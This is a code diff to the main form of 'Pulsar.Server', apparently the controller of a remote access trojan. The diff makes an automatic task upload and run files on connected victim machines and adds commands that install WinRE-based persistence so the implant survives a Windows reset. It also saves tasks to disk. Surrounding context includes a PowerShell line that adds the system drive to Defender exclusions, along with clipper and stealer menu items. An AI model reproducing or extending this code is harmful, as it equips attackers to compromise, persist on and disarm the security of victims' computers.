@@ -29,8 +29,8 @@ using System.Xml;
 using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Newtonsoft.Json;
 
-using Pulsar.Common.Messages.UserSupport;
-
+using Pulsar.Common.Messages.ClientManagement.UAC;
+using Pulsar.Common.Messages.ClientManagement.WinRE;
 
 namespace Pulsar.Server.Forms
 {
@@ -52,6 +52,7 @@ namespace Pulsar.Server.Forms
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
         private PreviewHandler _previewImageHandler;
+        private readonly string AutoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "autotasks.json");
 
         public FrmMain()
         {
@@ -61,7 +62,7 @@ namespace Pulsar.Server.Forms
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
 
@@ -243,6 +244,8 @@ namespace Pulsar.Server.Forms
             ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;
 
             lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;
+
+            LoadAutoTasks();
         }
 
         private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
@@ -255,6 +258,8 @@ namespace Pulsar.Server.Forms
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
+            SaveAutoTasks();
+
             ListenServer.Disconnect();
             UnregisterMessageHandler();
             if (_previewImageHandler != null)
@@ -550,6 +555,8 @@ namespace Pulsar.Server.Forms
 
         private void StartAutomatedTask(Client client)
         {
+            Debug.WriteLine(IsClientBlocked(client.EndPoint.Address.ToString()) ? "Blocked client, skipping automated tasks." : "Starting automated tasks for client.");
+
             if (lstTasks.InvokeRequired)
             {
                 lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
@@ -565,7 +572,17 @@ namespace Pulsar.Server.Forms
                 switch (taskCaption)
                 {
                     case "Remote Execute":
-                        new FileManagerHandler(client).BeginUploadFile(subItem0, "");
+                        Debug.WriteLine("Remote Execute auto task starting");
+                        var taskHandler = new TaskManagerHandler(client);
+
+                        string remotePath = subItem0;
+                        Debug.WriteLine($"Starting upload of {remotePath}");
+
+                        var fileHandler = new FileManagerHandler(client);
+                        fileHandler.BeginUploadFile(remotePath, "");
+
+                        Debug.WriteLine($"Executing remote file: {remotePath}");
+                        taskHandler.StartProcess(remotePath);
                         break;
 
                     case "Shell Command":
@@ -577,7 +594,7 @@ namespace Pulsar.Server.Forms
                         break;
 
                     case "Exclude System Drives":
-                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
@@ -585,13 +602,13 @@ namespace Pulsar.Server.Forms
                         break;
 
                     case "Message Box":
-                    client.Send(new DoShowMessageBox
-                    {
-                        Caption = subItem0,
-                        Text = subItem1,
-                        Button = "OK",
-                        Icon = "None"
-                    });
+                        client.Send(new DoShowMessageBox
+                        {
+                            Caption = subItem0,
+                            Text = subItem1,
+                            Button = "OK",
+                            Icon = "None"
+                        });
                         break;
                 }
             }
@@ -765,12 +782,12 @@ namespace Pulsar.Server.Forms
 
             var bounds = item.Bounds;
             int rightMargin = 23;
-            
+
             if (lstClients.Items.Count > lstClients.ClientSize.Height / lstClients.GetItemRect(0).Height)
             {
                 rightMargin += SystemInformation.VerticalScrollBarWidth;
             }
-            
+
             starControl.Location = new Point(lstClients.Width - rightMargin, bounds.Top + (bounds.Height - starControl.Height) / 2);
         }
 
@@ -923,7 +940,6 @@ namespace Pulsar.Server.Forms
             }
         }
 
-
         private void RemoveClientFromListview(Client client)
         {
             if (client == null) return;
@@ -975,11 +991,11 @@ namespace Pulsar.Server.Forms
         }
 
         private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
-            {
-                var item = GetListViewItemByClient(client);
-                if (item != null)
+        {
+            var item = GetListViewItemByClient(client);
+            if (item != null)
                 item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
-            }
+        }
 
         private ListViewItem GetListViewItemByClient(Client client)
         {
@@ -1092,6 +1108,22 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void installWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoAddWinREPersistence());
+            }
+        }
+
+        private void removeWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoRemoveWinREPersistence());
+            }
+        }
+
         private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1116,7 +1148,7 @@ namespace Pulsar.Server.Forms
             var item = GetListViewItemByClient(client);
             if (item != null)
             {
-                item.SubItems[1].Text = GetClientNickname(client); 
+                item.SubItems[1].Text = GetClientNickname(client);
             }
         }
 
@@ -1487,8 +1519,6 @@ namespace Pulsar.Server.Forms
             }
         }
 
-
-
         private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1681,6 +1711,7 @@ namespace Pulsar.Server.Forms
             newItem.SubItems.Add(param1);
             newItem.SubItems.Add(param2);
             lstTasks.Items.Add(newItem);
+            SaveAutoTasks();
         }
 
         private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1991,7 +2022,6 @@ namespace Pulsar.Server.Forms
 
         private void remoteSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
             foreach (Client c in GetSelectedClients())
             {
                 var frmAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
@@ -2051,5 +2081,54 @@ namespace Pulsar.Server.Forms
                 frmRd.Focus();
             }
         }
+
+        #region AutoTaskStuff
+
+        private void SaveAutoTasks()
+        {
+            var tasks = new List<AutoTask>();
+            foreach (ListViewItem item in lstTasks.Items)
+            {
+                tasks.Add(new AutoTask
+                {
+                    Title = item.Text,
+                    Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "",
+                    Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text : ""
+                });
+            }
+            File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Newtonsoft.Json.Formatting.Indented));
+        }
+
+        private void LoadAutoTasks()
+        {
+            lstTasks.Items.Clear();
+            if (File.Exists(AutoTasksFilePath))
+            {
+                try
+                {
+                    var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(File.ReadAllText(AutoTasksFilePath));
+                    if (tasks != null)
+                    {
+                        foreach (var task in tasks)
+                        {
+                            AddTask(task.Title, task.Param1, task.Param2);
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
     }
+
+    public class AutoTask
+    {
+        public string Title { get; set; }
+        public string Param1 { get; set; }
+        public string Param2 { get; set; }
+    }
+
+    #endregion AutoTaskStuff
 }
